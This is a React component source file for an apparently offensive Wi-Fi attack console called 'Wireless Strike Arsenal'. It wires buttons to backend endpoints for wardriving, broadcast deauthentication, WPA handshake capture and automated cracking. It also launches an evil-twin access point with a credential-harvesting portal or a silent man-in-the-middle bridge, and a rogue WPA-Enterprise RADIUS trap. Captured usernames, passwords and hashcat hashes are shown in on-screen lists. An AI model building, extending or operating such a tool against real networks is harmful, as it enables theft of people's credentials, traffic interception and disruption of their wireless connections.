export default function WiFiStrikePanel({
  apiCall, networks, setNetworks,
  rogueAPActive, setRogueAPActive, rogueAPMode, setRogueAPMode,
  rogueAPSSID, setRogueAPSSID, rogueAPCreds, setRogueAPCreds,
  rogueRADIUSActive, setRogueRADIUSActive, rogueRADIUSSSID, setRogueRADIUSSSID,
  rogueRADIUSHashes, setRogueRADIUSHashes,
  autoAttacking, setAutoAttacking,
}) {
  return (
    <div className="glass-card fade-in" style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: '1rem', overflowY: 'auto' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <h3>Wireless Strike Arsenal</h3>
        <div style={{ display: 'flex', gap: '0.5rem' }}>
          <button className="btn-primary" onClick={() => {
            apiCall('/bettercap/command', 'POST', { cmd: 'wifi.recon on' });
          }}>START WARDRIVER</button>
          <button className="btn-primary" onClick={async () => {
            const data = await apiCall('/wifi_scan');
            if (data) setNetworks(data.networks || []);
          }}>REFRESH BANDS</button>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(270px, 1fr))', gap: '1rem' }}>
        {networks.length === 0
          ? <p style={{ color: 'var(--text-secondary)' }}>No networks found. Run a scan or start wardriving.</p>
          : networks.map((n) => (
            <div key={n.mac} className="glass-card" style={{ padding: '1rem', background: 'rgba(255,255,255,0.02)' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', overflow: 'hidden' }}>
                <p style={{ fontWeight: 900, whiteSpace: 'nowrap', textOverflow: 'ellipsis', overflow: 'hidden', paddingRight: '0.5rem' }} title={n.ssid || 'HIDDEN'}>{n.ssid || 'HIDDEN'}</p>
                <p style={{ color: 'var(--neo-cyan)', fontSize: '0.8rem', whiteSpace: 'nowrap' }}>{n.rssi} dBm</p>
              </div>
              <div style={{ fontSize: '0.65rem', color: 'var(--text-secondary)', marginTop: '0.5rem' }}>
                MAC: {n.mac}<br />CH: {n.channel} | ENC: {n.encryption}
              </div>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.35rem', marginTop: '0.9rem' }}>
                <button className="btn-primary" style={{ fontSize: '0.55rem', padding: '0.35rem' }}
                  onClick={() => apiCall('/wifi/deauth', 'POST', { target: 'FF:FF:FF:FF:FF:FF', ap: n.mac })}>
                  DEAUTH
                </button>
                <button className="btn-primary" style={{ fontSize: '0.55rem', padding: '0.35rem' }}
                  onClick={() => apiCall(`/wifi/capture?bssid=${encodeURIComponent(n.mac)}`, 'POST')}>
                  LISTEN (EAPOL)
                </button>
                <button className="btn-primary" style={{ fontSize: '0.55rem', padding: '0.35rem', gridColumn: 'span 2', background: autoAttacking.has(n.mac) ? 'rgba(239,68,68,0.25)' : undefined, borderColor: autoAttacking.has(n.mac) ? '#ef4444' : undefined }}
                  disabled={autoAttacking.has(n.mac)}
                  onClick={async () => {
                    setAutoAttacking(prev => new Set([...prev, n.mac]));
                    await apiCall('/wifi/auto_attack', 'POST', { bssid: n.mac });
                    setAutoAttacking(prev => { const s = new Set(prev); s.delete(n.mac); return s; });
                  }}>
                  {autoAttacking.has(n.mac) ? 'AUTO-ATTACKING…' : 'AUTO-ATTACK (DEAUTH+CRACK)'}
                </button>
                <button className="btn-primary" style={{ fontSize: '0.55rem', padding: '0.35rem' }}
                  onClick={() => {
                    setRogueAPSSID(n.ssid || 'Free_WiFi');
                    apiCall('/rogue_ap/start', 'POST', { ssid: n.ssid || 'Free_WiFi', channel: n.channel || 6, mode: rogueAPMode })
                      .then(r => { if (r) setRogueAPActive(true); });
                  }}>
                  EVIL TWIN
                </button>
                <button className="btn-primary" style={{ fontSize: '0.55rem', padding: '0.35rem' }}
                  onClick={() => {
                    setRogueRADIUSSSID(n.ssid || 'CorpNet');
                    apiCall('/rogue_radius/start', 'POST', { ssid: n.ssid || 'CorpNet', channel: n.channel || 6 })
                      .then(r => { if (r) setRogueRADIUSActive(true); });
                  }}>
                  ENT TRAP
                </button>
              </div>
            </div>
          ))}
      </div>

      {/* Evil Twin AP Panel */}
      <div className="glass-card" style={{ padding: '1rem', border: '1px solid rgba(239,68,68,0.35)' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '0.5rem' }}>
          <span style={{ fontWeight: 700, fontSize: '0.8rem', color: '#f87171' }}>
            EVIL TWIN AP&nbsp;&nbsp;<span className={rogueAPActive ? 'pulse' : ''} style={{ color: rogueAPActive ? '#4ade80' : '#6b7280' }}>{rogueAPActive ? '● LIVE' : '○ IDLE'}</span>
          </span>
          <div style={{ display: 'flex', gap: '0.4rem', alignItems: 'center', flexWrap: 'wrap' }}>
            <select value={rogueAPMode} onChange={e => setRogueAPMode(e.target.value)}
              style={{ fontSize: '0.65rem', background: 'rgba(0,0,0,0.6)', color: 'white', border: '1px solid rgba(255,255,255,0.2)', borderRadius: '4px', padding: '0.25rem 0.4rem' }}>
              <option value="portal">Portal — harvest creds</option>
              <option value="bridge">Bridge — silent MITM</option>
            </select>
            <input value={rogueAPSSID} onChange={e => setRogueAPSSID(e.target.value)} placeholder="SSID"
              style={{ width: '90px', fontSize: '0.65rem', background: 'rgba(0,0,0,0.6)', color: 'white', border: '1px solid rgba(255,255,255,0.2)', borderRadius: '4px', padding: '0.25rem 0.4rem' }} />
            <button className={`btn-primary ${rogueAPActive ? 'btn-danger' : ''}`} style={{ fontSize: '0.6rem' }} onClick={async () => {
              if (rogueAPActive) {
                await apiCall('/rogue_ap/stop', 'POST', {});
                setRogueAPActive(false);
              } else {
                const r = await apiCall('/rogue_ap/start', 'POST', { ssid: rogueAPSSID, mode: rogueAPMode });
                if (r) setRogueAPActive(true);
              }
            }}>{rogueAPActive ? 'STOP AP' : 'LAUNCH AP'}</button>
            {rogueAPActive && (
              <button className="btn-primary" style={{ fontSize: '0.6rem' }} onClick={async () => {
                const r = await apiCall('/rogue_ap/creds');
                if (r) setRogueAPCreds(r.creds || []);
              }}>REFRESH CREDS ({rogueAPCreds.length})</button>
            )}
          </div>
        </div>
        {rogueAPCreds.length > 0 && (
          <div style={{ marginTop: '0.75rem', maxHeight: '130px', overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '0.2rem' }}>
            {rogueAPCreds.map((c, i) => (
              <div key={i} style={{ fontSize: '0.65rem', padding: '0.25rem 0.4rem', background: 'rgba(0,0,0,0.3)', borderRadius: '4px' }}>
                <span style={{ color: 'var(--neo-cyan)' }}>{c.src_ip}</span>
                <span style={{ color: 'var(--text-secondary)', margin: '0 0.4rem' }}>→</span>
                <span style={{ color: '#f87171' }}>{c.user}</span>
                <span style={{ color: 'var(--text-secondary)' }}>:{c.password}</span>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* WPA-Enterprise RADIUS Trap */}
      <div className="glass-card" style={{ padding: '1rem', border: '1px solid rgba(168,85,247,0.35)' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '0.5rem' }}>
          <span style={{ fontWeight: 700, fontSize: '0.8rem', color: '#a855f7' }}>
            WPA-ENTERPRISE TRAP&nbsp;&nbsp;<span className={rogueRADIUSActive ? 'pulse' : ''} style={{ color: rogueRADIUSActive ? '#4ade80' : '#6b7280' }}>{rogueRADIUSActive ? '● LIVE' : '○ IDLE'}</span>
          </span>
          <div style={{ display: 'flex', gap: '0.4rem', alignItems: 'center', flexWrap: 'wrap' }}>
            <input value={rogueRADIUSSSID} onChange={e => setRogueRADIUSSSID(e.target.value)} placeholder="Corp SSID"
              style={{ width: '100px', fontSize: '0.65rem', background: 'rgba(0,0,0,0.6)', color: 'white', border: '1px solid rgba(255,255,255,0.2)', borderRadius: '4px', padding: '0.25rem 0.4rem' }} />
            <button className={`btn-primary ${rogueRADIUSActive ? 'btn-danger' : ''}`} style={{ fontSize: '0.6rem' }} onClick={async () => {
              if (rogueRADIUSActive) {
                await apiCall('/rogue_radius/stop', 'POST', {});
                setRogueRADIUSActive(false);
              } else {
                const r = await apiCall('/rogue_radius/start', 'POST', { ssid: rogueRADIUSSSID });
                if (r) setRogueRADIUSActive(true);
              }
            }}>{rogueRADIUSActive ? 'STOP RADIUS' : 'LAUNCH RADIUS'}</button>
            {rogueRADIUSActive && (
              <button className="btn-primary" style={{ fontSize: '0.6rem' }} onClick={async () => {
                const r = await apiCall('/rogue_radius/hashes');
                if (r) setRogueRADIUSHashes(r.hashes || []);
              }}>REFRESH HASHES ({rogueRADIUSHashes.length})</button>
            )}
          </div>
        </div>
        {rogueRADIUSHashes.length > 0 && (
          <div style={{ marginTop: '0.75rem', maxHeight: '130px', overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '0.2rem' }}>
            {rogueRADIUSHashes.map((h, i) => (
              <div key={i} style={{ fontSize: '0.6rem', padding: '0.25rem 0.4rem', background: 'rgba(0,0,0,0.3)', borderRadius: '4px' }}>
                <span style={{ color: '#a855f7', fontWeight: 700 }}>{h.identity}</span>
                <span style={{ color: 'var(--text-secondary)', marginLeft: '0.5rem', wordBreak: 'break-all', fontFamily: 'monospace' }}>{h.hashcat}</span>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
